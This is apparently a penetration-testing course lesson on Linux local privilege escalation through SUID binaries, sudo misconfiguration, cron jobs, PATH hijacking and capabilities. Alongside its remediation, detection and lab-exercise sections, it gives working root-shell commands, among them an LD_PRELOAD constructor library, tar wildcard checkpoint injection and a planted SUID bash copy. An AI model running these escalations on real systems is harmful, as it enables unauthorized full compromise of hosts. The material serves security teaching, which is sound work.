# 04.2 — Local privilege escalation I: SUID/SGID, sudo, cron, PATH & capabilities

<div class="prereq">

**Prerequisites:** [04.1 Linux for testers](lesson-01.md) — you must understand UIDs, the SUID
mechanism, process inheritance, PATH, and how to build a surface inventory. Also
[M00](../module-00/lesson-01.md) (authorization) and [00.3](../module-00/lesson-03.md) (the
confused deputy).
**Module:** M04. **Difficulty:** 🟡 intermediate.
**M04 assumes** a low-privileged `lab` shell on a lab host. This lesson turns the inventory from
04.1 into root.
**You will produce:** one *justified, verified* escalation path on the lab host, plus its
remediation and detection write-up.

</div>

## Why this matters

These five vectors — SUID/SGID abuse, sudo misconfiguration, cron jobs, PATH hijacking, and Linux
capabilities — are the bread and butter of Linux local privilege escalation. On real internal
engagements they are, by a wide margin, how testers go from a foothold to root: not kernel exploits
(04.3), but an administrator's misconfiguration that hands privilege to a process you can influence.
Every one is a variation on the same theme from 04.1 — *a privileged actor plus an input you
control* — and every one has a clean remediation and a detectable signature you must be able to
write for the client. Learn the mechanism, not the incantation, and you can escalate on hosts you've
never seen.

## Learning objectives

- Explain *why* a given SUID or sudo-allowed binary yields a shell or file primitive (the GTFOBins
  reasoning), not just which command to paste.
- Abuse sudo misconfiguration: `NOPASSWD`, abusable allowed binaries, and `env_keep`/`LD_PRELOAD`.
- Recognize and exploit writable cron scripts and cron wildcard injection.
- Recognize and exploit PATH hijacking when a privileged program calls a command by bare name.
- Recognize and exploit dangerous Linux capabilities (`cap_setuid`, `cap_dac_read_search`, …).
- For each vector, state the remediation **and** the blue-team detection — every time.

## Intuition

A program that runs with more privilege than you have is a **loaded tool pointed at the system**. If
you can make that tool do something general — run a command of your choosing, read or write an
arbitrary file — you inherit its privilege for that action. The whole game is: find the privileged
tool, then find the *general primitive* it offers. `find` can run commands. `less` can spawn a
shell. Python can call `setuid(0)`. `tar` can run a checkpoint action. None of these were designed
as attack tools; each simply offers a capability that becomes escalation when the tool runs as root.

## The underlying technology

### GTFOBins reasoning — why "known-abusable" binaries work

**GTFOBins** is a catalog of standard Unix binaries and the ways each can break out of its intended
function — spawn a shell, read a file, write a file, run a command. It is not a list of magic
spells; it is a list of *general primitives hidden in ordinary tools*. The reasoning is always the
same two-step:

1. **Does this binary offer a general primitive?** Can it execute a command (`-exec`, `!command`,
   `:!sh`), read a file it shouldn't, write a file, or load code you control?
2. **Does it run with privilege I don't have?** Because it is SUID-root, or because sudo lets me run
   it as root, or because it holds a capability.

When both are true, you get that primitive **at that privilege level**. `sudo less /var/log/x`
gives root because `less`, while paged and running as root, accepts `!sh` to spawn a subshell — and
that subshell inherits `less`'s effective UID 0 (04.1's inheritance rule). Nothing about `less` is
"hacked"; you used a documented feature of a program that happened to be running as root.

### SUID/SGID abuse

A SUID-root binary runs with effective UID 0. If it is a binary with a shell or command primitive
(and many are, by design), you inherit root:

```text
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/find
```

`find` has a `-exec` action that runs an arbitrary command for each match. Run as root (SUID), that
command runs as root:

```bash
# LAB ONLY. -exec runs /bin/sh; find keeps effective UID 0, so the shell is root.
find . -exec /bin/sh -p \; -quit
# -p tells the shell not to drop the elevated effective UID.
```

The `-p` matters: `bash`/`dash` normally *reset* the effective UID to the real UID when they start,
defeating the SUID. `-p` (privileged mode) keeps it. Understanding that detail is the difference
between "it works" and "why didn't it work."

### sudo misconfiguration

`sudo -l` lists what you may run as another user. Read it as a menu of privileged primitives:

```text
$ sudo -l
User lab may run the following commands on lab-04:
    (root) NOPASSWD: /usr/bin/less /var/log/syslog
    (root) NOPASSWD: SETENV: /usr/bin/python3
    Defaults env_keep += "LD_PRELOAD"
```

Three separate problems:

- **Abusable allowed binary.** `sudo less` runs `less` as root; `!sh` from inside the pager spawns a
  root shell. Same for `vi`/`vim` (`:!sh`), `awk`, `find`, `man`, `tar`, and dozens more — check
  GTFOBins for the specific primitive.
- **NOPASSWD** removes the password gate, so you don't even need the `lab` password — but the danger
  is the *binary*, not the missing password. A NOPASSWD rule for a truly safe binary is fine; a rule
  (with or without password) for `less` is root.
- **`env_keep += LD_PRELOAD`** preserves the `LD_PRELOAD` environment variable across the sudo
  boundary. `LD_PRELOAD` forces the dynamic linker to load *your* shared object before anything
  else, running your code inside the privileged process:

```c
/* LAB ONLY — shell.c: constructor runs on load, before main, as root. */
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void x(void){ setuid(0); setgid(0);
  system("/bin/bash -p"); }
```

```bash
gcc -shared -fPIC -o /tmp/shell.so /tmp/shell.c
sudo LD_PRELOAD=/tmp/shell.so <any-allowed-command>   # loads shell.so as root → root shell
```

This works because `env_keep` told sudo to trust an environment variable that controls code
loading. `SETENV` in a rule is the same danger (it lets you set env vars for that command).

### cron jobs — writable scripts and wildcard injection

Cron runs scheduled jobs, often **as root**. Two classic flaws:

- **Writable script.** A root cron job runs `/opt/backup/run.sh`, and that file (or its directory)
  is writable by `lab`. You append your command; cron runs it as root on the next tick.

```bash
ls -la /opt/backup/run.sh      # -rwxrwxr-x lab lab  → you can write it
echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' >> /opt/backup/run.sh
# next run: /tmp/rootbash -p  → root shell (SUID copy of bash)
```

- **Wildcard injection.** A root cron job runs `tar -czf backup.tar.gz *` in a directory you can
  write to. The shell expands `*` to the filenames, so a file *named like an option* becomes an
  argument to `tar`. `tar`'s `--checkpoint-action=exec=...` then runs your command as root:

```bash
cd /var/backups                 # the dir the cron 'tar *' runs in, writable by lab
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# when root's cron runs `tar ... *`, the wildcard becomes tar options → runs shell.sh as root
```

The weakness is that `*` is expanded by the shell into whatever files exist, and `tar` cannot tell
an intended filename from an injected option. This is **argument injection via glob**.

### PATH hijacking

If a privileged program (a SUID binary, a sudo-allowed script, a root cron job) invokes another
command **by bare name** rather than absolute path — `system("service ...")`, or a script that
calls `date` without `/bin/date` — the dynamic lookup walks `PATH`. If you can put a directory you
control earlier in the effective `PATH`, your malicious `service`/`date` runs with the caller's
privilege:

```bash
# A SUID binary calls system("ps") with no absolute path.
cd /tmp; echo -e '#!/bin/sh\n/bin/bash -p' > ps; chmod +x ps
export PATH=/tmp:$PATH
/usr/local/bin/vuln_suid_prog     # its system("ps") finds /tmp/ps first → root shell
```

The weakness is calling programs by relative name in a privileged context (CWE-426, untrusted search
path). You recognize it by `strings`/`ltrace` on the binary, or by reading the script, and seeing a
bare command name.

### Linux capabilities

Capabilities split root's power into ~40 distinct units so a program can hold *some* root abilities
without full SUID-root. `getcap` lists them:

```text
$ getcap -r / 2>/dev/null
/usr/bin/python3.11 cap_setuid+ep
/usr/bin/perl cap_setuid+ep
```

`cap_setuid` lets the binary call `setuid(0)` — become root — without being SUID-root. So:

```bash
# LAB ONLY. python already may setuid(0) because of cap_setuid; then exec a shell.
python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Other dangerous ones: **`cap_dac_read_search`** (bypass file-read permission checks — read
`/etc/shadow`, any file), **`cap_dac_override`** (bypass read/write checks), **`cap_setuid`/
`cap_setgid`** (change IDs). The `+ep` means effective+permitted. A capability is abusable when the
binary that holds it can be made to use that power for you — which for interpreters (python, perl,
ruby) is always, because they run arbitrary code.

## Why the weakness exists

Every vector here is an administrator granting privilege to solve a problem: SUID so operators don't
need root, a sudo rule so automation runs unattended, a cron job that "just needs" a writable drop
directory, a capability chosen because it sounded safer than SUID. The failure is granting a
privileged actor an input path the admin didn't realize was general — CWE-250 (unnecessary
privilege) and CWE-269 (improper privilege management), plus CWE-426 (untrusted search path) for
PATH. The kernel is doing exactly what it was told.

## How a tester recognizes it

From the 04.1 inventory: any SUID/SGID binary that appears on GTFOBins; any `sudo -l` entry that
isn't a genuinely safe binary, or any `env_keep`/`SETENV`/`LD_PRELOAD`; any root cron job (from
`/etc/crontab`, `/etc/cron.*`, or **pspy**) whose script or directory you can write, or that uses an
unquoted `*`; any privileged program that calls commands by bare name; any `getcap` result on an
interpreter or a binary with an obvious primitive.

## Tooling — what it does, key options, limits, verify by hand

- **GTFOBins (gtfobins.github.io)** — look up the exact primitive for a binary (shell / file-read /
  file-write / sudo / suid / capabilities sections). It tells you *what* works; 04.1 tells you *why*.
- **`sudo -l`** — the authoritative list of your sudo rights; always run it first. Limit: it may
  require the password to list.
- **pspy** — catches cron jobs and short-lived root processes without needing root, revealing jobs
  not in your readable crontabs. Limit: noisy, and only shows what runs *while you watch*.
- **LinPEAS** — flags all of the above at once. Limit: a lead generator, not proof; loud on disk and
  in logs (detection risk), and RoE may forbid dropping it. **Always verify each flag by hand** — a
  SUID binary not on GTFOBins, or a sudo rule for a truly safe program, is not a path.

## Exploitation / demonstration (LAB ONLY)

<div class="callout attack">

**Technique — GTFOBins abuse of a sudo-allowed binary.** Given `sudo -l` showing
`(root) NOPASSWD: /usr/bin/less /var/log/syslog`, escalate:

```bash
sudo less /var/log/syslog
# inside the pager, type:
!/bin/sh
# → a shell whose effective UID is 0, because less was running as root and !cmd inherits it.
id   # uid=0(root)
```

Why: `less` runs as root (sudo); its `!command` feature spawns a subshell; per 04.1's inheritance
rule that subshell keeps `less`'s effective UID 0. The fix is not "remove `!` from less" — it is
"don't let `lab` run `less` as root."

</div>

<div class="callout legal">

**LAB TARGET vs REAL SYSTEM.** Every command above targets `lab-04-linux-privesc` on the isolated
network, as the synthetic `lab` user, against the benign `LAB-FLAG-{uuid}`. Running any of this
against a system you do not own and are not explicitly authorized to test is a crime (M00). Restate
scope and authorization before you touch anything outside the lab.

</div>

## Verification

Confirm escalation cleanly: `id` returns `uid=0(root)`; `whoami` returns `root`; you can now read the
root-only proof, `cat /root/flag.txt` → `LAB-FLAG-{uuid}`. If you dropped a SUID bash, `ls -l
/tmp/rootbash` shows the `s` bit and `/tmp/rootbash -p` gives `uid=0`. Verification is part of the
finding — "I got a root shell" without the `id` output is not evidence.

## Impact

Root on the host means: read every file (all users' data, `/etc/shadow` → offline cracking in M10),
modify any file, install persistence, harvest credentials and keys for lateral movement (M11),
disable logging, and pivot. In business terms, a single low-priv foothold plus one of these
misconfigurations equals full compromise of the host and everything it can reach — which is exactly
how you frame it in the report (M16).

## Remediation

<div class="callout defend">

- **SUID/SGID:** remove the bit from anything that doesn't need it (`chmod u-s`); audit with `find /
  -perm -4000`. Never SUID interpreters or tools with command/file primitives.
- **sudo:** grant the narrowest command possible; avoid abusable binaries; never `env_keep`
  `LD_PRELOAD`/`LD_LIBRARY_PATH`; prefer `NOEXEC` where supported; keep `NOPASSWD` off unless truly
  needed and only for safe binaries.
- **cron:** root cron jobs must call **absolute-path** scripts that are **root-owned and
  not writable** by others, in non-writable directories; never `tar/chmod/chown *` on a writable
  directory — use `find` or an explicit file list.
- **PATH:** privileged programs must call commands by **absolute path** and set a clean `PATH`;
  never rely on the caller's `PATH`.
- **capabilities:** grant the minimum; never put `cap_setuid`/`cap_dac_*` on an interpreter; audit
  with `getcap -r /`.

All of these are one principle: **least privilege** (CWE-250).

</div>

## Detection / blue-team view

<div class="callout defend">

- **SUID abuse:** auditd `execve` logging of SUID binaries spawning shells (`find … -exec /bin/sh`,
  a shell child of `less`/`vi`); alert on a new SUID file appearing (`/tmp/rootbash`).
- **sudo:** sudo logs every invocation (`/var/log/auth.log`); alert on `sudo` of interactive/abusable
  binaries and on `LD_PRELOAD` in a sudo environment.
- **cron:** file-integrity monitoring on cron scripts and their directories; alert on writes by
  non-root; **pspy**-style anomalies (root process with an odd command line) show up in
  process-creation telemetry.
- **PATH/capabilities:** unusual `PATH` in a privileged process; a root shell parented by an
  interpreter that holds a capability.

All of this is **MITRE ATT&CK T1548 — Abuse Elevation Control Mechanism** (T1548.001
Setuid/Setgid, T1548.003 Sudo and Sudo Caching), with cron under **T1053 (Scheduled Task/Job)**.
The recurring detection idea: *a privileged process spawning an interactive shell is rarely normal.*

</div>

## Practical lab

<div class="lab">

**Environment:** `labs/lab-04-linux-privesc` (built separately) — an intentionally misconfigured
Linux container on the isolated network. **Access:** the `lab` shell. **Targets:** the lab host only;
the `LAB-FLAG-{uuid}` in `/root` is readable only by root — reading it proves escalation. **Time:**
~75 min. **Isolation:** private Docker network, no Internet route; reset per the lab README between
attempts. The host deliberately mixes SUID/SGID, sudo, cron, PATH, and capability misconfigs.

</div>

Using your 04.1 inventory, pick **one** path, exploit it, verify with `id` and the flag, then write
the remediation and detection for that specific finding. Then reset and try a *second, different*
vector for practice.

## Exercise

<div class="callout method">

**Situation.** Authorized internal engagement; you hold a `lab` shell on the lab host and have your
04.1 surface inventory in hand. The client wants a demonstrated, reproducible escalation with a fix.

**Objective.** Find, **justify**, and **verify** one privilege-escalation path to root, then write
its remediation and detection — a report-ready finding.

**Starting information.** Your `lab` shell and 04.1 inventory. No pre-built exploit.

**Constraints.** Lab target only. You must be able to explain *why* the primitive works (the
mechanism), not just paste a command. No destructive actions beyond what the escalation requires;
note anything you'd have to clean up (e.g. a dropped SUID binary).

**Expected deliverables.**
1. The chosen vector and the **mechanism** (which primitive, why it runs privileged, why you inherit
   it — reference the SUID/inheritance/`env_keep` reasoning explicitly).
2. Reproduction steps and **verification evidence** (`id` = `uid=0`, the `LAB-FLAG-{uuid}`).
3. **Remediation** (specific, actionable) **and** **detection** (what telemetry catches it, mapped to
   ATT&CK) — both are required; a finding without them is incomplete.
4. A note on cleanup / artifacts left behind.

</div>

<details><summary>Hint 1 — conceptual direction</summary>
Return to "privileged actor + input you control." Which inventory row has a clean, deterministic
primitive (a shell or a file write) at root privilege? Prefer it over anything you must wait for.
</details>

<details><summary>Hint 2 — technique family</summary>
Is your best row a SUID binary (GTFOBins shell/suid section), a sudo rule (abusable binary or
env_keep), a writable/wildcard cron job, a PATH-called command, or a capability on an interpreter?
</details>

<details><summary>Hint 3 — where to look</summary>
Look the binary up on GTFOBins for the exact primitive. For sudo, re-read <code>sudo -l</code> for
<code>env_keep</code>/<code>SETENV</code>. For capabilities, <code>getcap -r /</code> then the
interpreter's setuid call. Remember shell <code>-p</code> for SUID shells.
</details>

<details><summary>Hint 4 — specific investigation direction</summary>
If it's a SUID shell-capable binary, remember <code>/bin/sh -p</code> to keep the effective UID. If
it's <code>env_keep LD_PRELOAD</code>, compile a constructor <code>.so</code>. If it's a capability
on python, <code>os.setuid(0)</code> then a shell. Verify with <code>id</code> every time.
</details>

## Check yourself

<div class="callout key">

1. Why does `sudo less` give a root shell, but `sudo cat` does not? What property distinguishes the
   two binaries?
2. You copy `/bin/bash` to `/tmp/rb` from a root context and set the SUID bit, but `/tmp/rb` gives
   you `uid=1000`, not root. What flag fixes it, and what is bash doing without it?
3. Explain, mechanically, why `env_keep += LD_PRELOAD` in sudoers is dangerous even for a "safe"
   allowed command.
4. A root cron job runs `tar -czf /backup/b.tgz *` in `/data`, which you can write to. You don't
   control the cron script itself. How do you still get code execution, and why does it work?
5. `getcap` shows `/usr/bin/perl cap_setuid+ep`. Why is a capability on an interpreter effectively
   equivalent to SUID-root here?

</div>

Model answers are in `solutions/module-04.md` (try them before looking).

## References

- **GTFOBins** — gtfobins.github.io: per-binary shell/file/sudo/suid/capability primitives.
- **`sudo(8)` / `sudoers(5)`** — `NOPASSWD`, `env_keep`, `SETENV`, `NOEXEC`, secure_path.
- **`capabilities(7)`** — the capability set, `+ep` semantics, and each capability's power.
- **`crontab(5)` / `cron(8)`** — cron file format and execution context.
- **`ld.so(8)`** — `LD_PRELOAD`/`LD_LIBRARY_PATH` and why they're ignored for SUID binaries (but not
  across a badly configured sudo).
- **HackTricks** — Linux privilege escalation (SUID, sudo, cron, PATH, capabilities) — conceptual,
  verify by hand.
- **MITRE ATT&CK** — **T1548** Abuse Elevation Control Mechanism (.001 Setuid/Setgid, .003 Sudo);
  **T1053** Scheduled Task/Job.
- **CWE-250** Unnecessary Privileges; **CWE-269** Improper Privilege Management; **CWE-426**
  Untrusted Search Path.

## What you should now be able to do

- Explain the GTFOBins reasoning and identify the general primitive inside a privileged binary.
- Escalate via SUID/SGID, sudo (NOPASSWD / abusable binary / `env_keep` LD_PRELOAD), writable and
  wildcard cron jobs, PATH hijacking, and dangerous capabilities — and say *why* each works.
- Verify escalation with concrete evidence.
- Write the specific remediation and the ATT&CK-mapped detection for every one of these vectors.

## Progress checkpoint

```bash
py course.py complete 04.2
```
</content>
